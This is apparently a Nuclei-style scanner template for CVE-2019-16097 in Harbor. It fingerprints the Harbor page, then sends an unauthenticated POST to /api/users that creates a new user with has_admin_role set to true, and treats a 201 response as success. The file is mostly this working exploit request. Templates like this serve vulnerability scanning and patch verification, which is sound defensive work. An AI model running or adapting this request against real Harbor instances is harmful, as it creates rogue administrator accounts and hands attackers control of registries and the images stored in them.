id: yaml-poc-goharbor-harbor-unauthorized_access-CVE-2019-16097
info:
  name: Yaml Poc Goharbor Harbor Unauthorized_Access Cve 2019 16097
  author: converted
  severity: medium
  description: 'Converted from xpoc: yaml-poc-goharbor-harbor-unauthorized_access-CVE-2019-16097'
  tags: unauth,cve
  classification:
    cve-id: CVE-2019-16097
  reference:
  - http://www.vmware.com/security/advisories/VMSA-2019-0015.html
  - https://github.com/goharbor/harbor/commit/b6db8a8a106259ec9a2c48be8a380cb3b37cf517
  - https://github.com/goharbor/harbor/compare/v1.8.2...v1.9.0-rc1
  - https://github.com/goharbor/harbor/releases/tag/v1.7.6
  - https://github.com/goharbor/harbor/releases/tag/v1.8.3
http:
- method: GET
  path:
  - /
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Harbor
- method: POST
  path:
  - /api/users
  body: '{"username": "{{r2}}", "has_admin_role": true, "password": "{{r2}}", "email":
    "{{r2}}@example.com", "realname": "{{r2}}"}'
  headers:
    Content-Type: application/json
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
